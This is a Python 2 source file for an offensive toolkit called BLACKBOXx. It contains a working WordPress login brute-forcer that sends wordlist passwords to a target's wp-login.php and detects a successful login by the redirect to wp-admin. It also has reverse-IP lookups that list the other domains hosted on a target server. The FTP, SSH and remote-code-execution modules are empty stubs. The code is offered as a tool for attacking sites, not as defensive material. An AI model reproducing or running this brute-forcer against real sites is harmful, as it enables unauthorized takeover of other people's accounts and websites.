#!/usr/bin/env python
#####################################NOTICE######################################
###     This program is free software: you can redistribute it and/or modify  ###
###     it under the terms of the GNU General Public License as published by  ###
###     the Free Software Foundation, either version 3 of the License, or     ###
###     (at your option) any later version.                                   ###
###     This program is distributed in the hope that it will be useful,       ###
###                                                                           ###
###     but WITHOUT ANY WARRANTY; without even the implied warranty of        ###
###     MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the         ###
###     GNU General Public License for more details.                          ###
###     You should have received a copy of the GNU General Public License     ###
###     along with this program.  If not, see <http://www.gnu.org/licenses/>  ###
#################################################################################
import requests,json,sys, time
from optparse import OptionParser

__author__  = 'Black Eye'
__gitbit__  = 'https://bitbucket.org/darkeye/'
__email__   = 'blackdoor197@yahoo.co.uk'
__twitter__ = 'https://twitter.com/darkeyepy'
__version__ = '0.5'
__license__ = 'GPLv2'
__scrname__ = 'BLACKBOXx v%s' % (__version__)

def __banner__():
	print color.BOLD+color.G+"""  _____ __    _____ _____ _____ _____ _____ __ __     
 | __  |  |  |  _  |     |  |  | __  |     |  |  |_ _ 
 | __ -|  |__|     |   --|    -| __ -|  |  |-   -|_'_|
 |_____|_____|__|__|_____|__|__|_____|_____|__|__|_,_|
                                                      """+color.W+color.BOLD+"""{"""+color.C+__version__+"#Dev"+color.W+"""}"""+color.ENDC
def __help__():
	print color.W+color.BOLD+"""Usage   : """+color.ENDC+""" python """+sys.argv[0]+""" {Module}"""+color.BOLD+color.W+"""
Help    : """+color.ENDC+""" python """+sys.argv[0]+""" -h/--help
"""+color.W+color.BOLD+"""Modules : """+color.ENDC+"""
\t\t+ Wordpress Bruteforce :   wordpress_brute  | Bruteforcing wordpress panel
\t\t+ Dnsinfo              :   dns_info         | Get Website in Server
\t\t+ ftp Bruteforce       :   ftp_brute        | Bruteforcing FTP login
\t\t+ ssh Bruteforce       :   ssh_brute        | Bruteforcing SSH login"""

class color:
	P    =  '\033[95m' # purple
	B    =  '\033[94m' # Blue
	BOLD =  '\033[1m'  # Bold
	G    =  '\033[92m' # Green
	Y    =  '\033[93m' # Yellow
	R    =  '\033[91m' # Red
	W    =  '\033[97m' # White
	BL   =  '\033[90m' # Black
	M    =  '\033[95m' # Magenta
	C    =  '\033[96m' # Cyan
	ENDC =  '\033[0m'  # end colors

class BruteForce:
	def wordpress(self, url, username,wordlist):
		headers = {
		'user-agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0'
		}
		ok = time.strftime('%H:%M:%S')
		datetime = '['+ok+']'
		url = "http://"+url+"/wp-login.php"
		if not requests.get(url).status_code == 200:
			print "Error with  : "+url+"\nResponse is : "+str(requests.get(url).status_code)
			return 1
		print color.G+datetime+color.W+" wordpress  : "+color.Y+url
		word = open(wordlist, 'r')
		word = word.readlines()
		for words in word:
			words = words.strip()
			
			payload = {'log' : username,
			           'pwd' : words}
			
			s = requests.post(url, data=payload, headers=headers)
			print color.R+"------------------------------------------------------------------"
			print color.G+datetime+color.W+" username   : "+color.Y+payload['log']
			print color.G+datetime+color.W+" password   : "+color.Y+payload['pwd']
			if "wp-admin" in s.url:
				print color.G+datetime+color.R+" Login Succes"+color.ENDC
				print color.R+"------------------------------------------------------------------"+color.ENDC				
				break
			elif "wp-login.php" in s.url:
				print color.G+datetime+color.C+" Login False"+color.ENDC
	def ftp_brute(self, url, wordlist):
		pass
	def ssh_brute(self, url, wordlist):
		pass
	def joomla(self, url, wordlist):
		pass

class rce:
	def joomla(self):
		pass
	def magento(self):
		pass

class dnsinfo:
	def checkhost(self, url):
		get = requests.get(url).status_code
		if get==200:
			pass
	def yougetsignal(self, ip):
		def Details():
			yougetsignal = 'http://domains.yougetsignal.com/domains.php'
			data = {
			'remoteAddress': ip,
			'key'          : ''}
			headers={
			'User-Agent'  : 'Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0',
			'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8'}

			get = requests.post(yougetsignal, data=data, headers=headers)
			get = get.text

			ok = json.loads(get)
			return ok
		
		def rzlt(details):
			print color.G+"Domains Hosted : "+color.W+color.BOLD+details['domainCount']+color.ENDC
			print color.G+"IP Address     : "+color.W+color.BOLD+details['remoteIpAddress']+color.ENDC
			print color.G+"Remote Address : "+color.W+color.BOLD+details['remoteAddress']+color.ENDC
			ipp = details['remoteIpAddress']
			rzt = open(ipp+".txt" ,'a')
			for domains,bl in details['domainArray']:
				rzt.write(domains+"\n")
			rzt.close
			print color.W+color.BOLD+"Domains is saved in "+ipp+".txt"+color.ENDC
		details = Details()
		rzlt(details)
	def viewdns(self, ip):
		viewdns = 'http://viewdns.info/reverseip/?host='
		dns = viewdns+ip+"&t=1"
		get = requests.get(dns)
		get = get.text
		black =re.findall(r"<td>(.*?)</td><td align=", get)
		for i in black:
			i=i.strip().lower()
			print i
def __main__():
	for arg in sys.argv:
		if (arg=="--help" or arg=="-h"):
			__help__()
		if (arg=="wordpress_brute"):
			parser = OptionParser()
			parser.add_option("--url",
				help="URL OF Target")
			parser.add_option("--username","-u",
				help="Username of Wordpress")
			parser.add_option("--wordlist","-w",
				help="Wordlist for attack target")
			(options,args) = parser.parse_args()
			url = options.url
			username = options.username
			wordlist = options.wordlist
			if url and username and wordlist:
				BruteForce().wordpress(url, username, wordlist)
				break
			errors = []
			if (url == None):
				errors.append("[-] No URL specified.")
			if (username == None):
				errors.append("[-] No username specified.")
			if (wordlist == None):
				errors.append("[-] No dictionary path specified.")
			if (len(errors) > 0):
				for error in errors:
					print color.BOLD+error+color.ENDC
		if (arg == "dns_info"):
			parser = OptionParser()
			parser.add_option("--ip",
				help="Parse IP address")
			parser.add_option("--viewdns","-v",
				help="Get website from viewdns",action="store_true")
			parser.add_option("--yougetsignal","-y",
				help="Get website from yougetsignal",action="store_true")
			(options,args) = parser.parse_args()
			ip = options.ip
			viewdns = options.viewdns
			yougetsignal = options.yougetsignal
			if ip and viewdns==True:
				dnsinfo().viewdns(ip)
			if ip and yougetsignal==True:
				dnsinfo().yougetsignal(ip)

if __name__ == '__main__':
	try:
		__banner__()
		__main__()
	except KeyboardInterrupt:
		print color.BOLD+color.Y+"Exiting Now !"+color.ENDC
		sys.exit(0)